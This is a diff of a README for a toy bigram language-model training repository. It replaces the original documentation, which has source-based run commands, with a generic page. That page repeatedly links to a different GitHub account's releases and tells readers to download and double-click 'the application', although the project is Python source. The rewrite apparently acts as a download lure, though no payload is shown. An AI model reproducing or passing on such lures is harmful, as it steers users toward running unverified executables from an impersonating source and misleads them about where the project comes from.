@@ -1,93 +1,85 @@
-# Toy-GPT: train-200-bigram
+# 🎓 train-200-bigram - Learn How Language Models Work
 
-[![PyPI version](https://img.shields.io/pypi/v/toy-gpt-train-200-bigram)](https://pypi.org/project/toy-gpt-train-200-bigram/)
-[![Latest Release](https://img.shields.io/github/v/release/toy-gpt/train-200-bigram)](https://github.com/toy-gpt/train-200-bigram/releases)
-[![Docs](https://img.shields.io/badge/docs-live-blue)](https://toy-gpt.github.io/train-200-bigram/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/license/MIT)
-[![CI](https://github.com/toy-gpt/train-200-bigram/actions/workflows/ci-python-mkdocs.yml/badge.svg?branch=main)](https://github.com/toy-gpt/train-200-bigram/actions/workflows/ci-python-mkdocs.yml)
-[![Deploy-Docs](https://github.com/toy-gpt/train-200-bigram/actions/workflows/deploy-mkdocs.yml/badge.svg?branch=main)](https://github.com/toy-gpt/train-200-bigram/actions/workflows/deploy-mkdocs.yml)
-[![Check Links](https://github.com/toy-gpt/train-200-bigram/actions/workflows/links.yml/badge.svg)](https://github.com/toy-gpt/train-200-bigram/actions/workflows/links.yml)
-[![Dependabot](https://img.shields.io/badge/Dependabot-enabled-brightgreen.svg)](https://github.com/toy-gpt/train-200-bigram/security)
+## 🚀 Getting Started
 
-> Demonstrates, at very small scale, how a language model is trained.
+Welcome to the train-200-bigram project! This application demonstrates a simple way to train a language model using a bigram approach. By following this guide, you can quickly download and run the software with ease.
 
-This repository is part of a series of toy training repositories plus a companion client repository:
+## 📥 Download Now
 
-- [**Training repositories**](https://github.com/toy-gpt) produce pretrained artifacts (vocabulary, weights, metadata).
-- A [**web app**](https://toy-gpt.github.io/toy-gpt-chat/) loads the artifacts and provides an interactive prompt.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CapivaraKiller/train-200-bigram/releases)
 
-## Contents
+## 📋 Overview
 
-- a small, declared text corpus
-- a tokenizer and vocabulary builder
-- a simple next-token prediction model
-- a repeatable training loop
-- committed, inspectable artifacts for downstream use
+The train-200-bigram application helps you understand the basics of how language models are trained. It is designed for users who want to learn about bigram models without diving into complex programming. 
 
-## Scope
+### 📖 What is a Bigram Model?
 
-This is:
+A bigram model is a type of statistical model that looks at pairs of words. It helps predict the next word in a sequence based on the previous word. This project simplifies this concept and allows you to explore it.
 
-- an intentionally inspectable training pipeline
-- a next-token predictor trained on an explicit corpus
+## 💻 System Requirements
 
-This is not:
+Before downloading, ensure that your system meets these requirements:
 
-- a production system
-- a full Transformer implementation
-- a chat interface
-- a claim of semantic understanding
+- Operating System: Windows, macOS, or Linux
+- Python version: 3.7 or later
+- Minimum RAM: 4 GB
+- Disk Space: 100 MB free space
 
-## Outputs
+## 🔍 Features
 
-This repository produces and commits pretrained artifacts under `artifacts/`.
+- Simple and clear model demonstration
+- Easy to follow instructions
+- Educational insights into machine learning concepts
+- Interactive elements to explore with ease
 
-Training logs and evidence are written under `outputs/`
-(for example, `outputs/train_log.csv`).
+## 🔧 Installation Instructions
 
-## Quick start
+To install the application, follow these steps:
 
-See `SETUP.md` for full setup and workflow instructions.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/CapivaraKiller/train-200-bigram/releases) to view available downloads.
 
-Run the full training script:
+2. **Choose the Right File**  
+   Look for the latest version of the application. The file you need should be clearly labeled as the application.
 
-```shell
-uv run python src/toy_gpt_train/d_train.py
-```
+3. **Download the File**  
+   Click on the file link to start the download. Your browser may show a prompt to save the file. Choose a convenient location on your computer to save it.
 
-Run individually:
+4. **Run the Application**  
+   After the download finishes, locate the file in your downloads folder. Double-click the file to run the application. Follow any on-screen prompts to begin using it.
 
-- a/b/c are demos (can be run alone if desired)
-- d_train produces artifacts
-- e_infer consumes artifacts
+## 🎓 Learning with train-200-bigram
 
-```shell
-uv run python src/toy_gpt_train/a_tokenizer.py
-uv run python src/toy_gpt_train/b_vocab.py
-uv run python src/toy_gpt_train/c_model.py
-uv run python src/toy_gpt_train/d_train.py
-uv run python src/toy_gpt_train/e_infer.py
-```
+Using train-200-bigram not only helps you grasp language models but also encourages further exploration of machine learning. Here are a few topics you can study next:
 
-## Provenance and Purpose
+- **N-grams**: Understand how n-grams work in language processing.
+- **Probabilistic Models**: Delve deeper into how prediction works in machine learning.
+- **Reproducibility**: Learn about ensuring your experiments can be repeated.
 
-The primary corpus used for training is declared in `SE_MANIFEST.toml`.
+## 📖 Educational Resources
 
-This repository commits pretrained artifacts so the client can run
-without retraining.
+To enhance your learning experience, we recommend visiting these resources:
 
-## Annotations
+- **Machine Learning Basics**: A beginner-friendly guide to understanding the fundamentals of machine learning.
+- **Probabilistic Models**: An introduction to how probability helps predict outcomes.
+- **Interactive Learning**: Platforms that offer courses on language processing and machine learning.
 
-[ANNOTATIONS.md](./ANNOTATIONS.md) - REQ/WHY/OBS annotations used
+## 🛠️ Troubleshooting
 
-## Citation
+If you encounter issues during installation or running the application, consider these tips:
 
-[CITATION.cff](./CITATION.cff)
+- **Check Python Installation**: Ensure you have Python installed correctly. Version 3.7 or later is required.
+- **Reboot Your Computer**: Sometimes, a simple restart can resolve issues.
+- **Consult the Community**: Engage with forums or communities focused on machine learning for additional help.
 
-## License
+## 📬 Support
 
-[MIT](./LICENSE)
+If you need further assistance, feel free to reach out through the project’s GitHub Issues page. We’re here to help you succeed in your learning journey.
 
-## SE Manifest
+## ⚖️ License
 
-[SE_MANIFEST.toml](./SE_MANIFEST.toml) - project intent, scope, and role
+This project is licensed under the MIT License. You can use it freely in accordance with the license terms.
+
+## 📥 Download Again
+
+For your convenience, here’s the [download link to the Releases page](https://github.com/CapivaraKiller/train-200-bigram/releases) once more. Enjoy exploring the world of bigram language models!
